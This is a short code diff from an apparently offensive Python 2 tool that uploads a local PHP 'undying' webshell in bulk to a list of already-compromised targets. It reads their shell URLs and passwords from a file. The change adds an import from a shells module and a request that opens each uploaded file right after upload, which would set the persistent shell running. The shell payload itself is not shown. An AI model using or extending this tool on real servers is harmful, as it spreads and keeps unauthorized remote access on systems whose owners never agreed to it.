@@ -5,6 +5,7 @@ import urllib
 import urllib2
 import base64
 import re
+from core.shells import *
 
 
 def post(url,data):
@@ -26,14 +27,15 @@ def get_shell_path(posturl,passwd):
         pass
     return shell_path
 
+
 # 默认为auxi目录下的shell.php 不死马
-def upload(localpath='auxi/shell.php'):
+def upload(localpath = 'auxi/shell.php'):
     print '\n+++++++++Batch Uploading Local File (Only for PHP webshell)++++++++++\n'
     shellfile = 'auxi/webshell.txt'  # 存放webshell路径和密码的文件
     localfile = localpath  # 本地待上传的文件名
-    flag=localfile.split('/')
-    x=len(flag)
-    filepath=flag[x-1]
+    flag = localfile.split('/')
+    x = len(flag)
+    filepath = flag[x - 1]
     shell_file = open(shellfile,'rb')
     local_content = str(open(localfile,'rb').read())
     for eachline in shell_file:
@@ -57,6 +59,8 @@ def upload(localpath='auxi/shell.php'):
                 response = post(posturl,data)
                 if response:
                     print '[+] ' + target_file_url + ', upload succeed!'
+                    check = urllib2.urlopen(target_file_url)
+                    check.close()
                 else:
                     print '[-] ' + target_file_url + ', upload failed!'
             else:
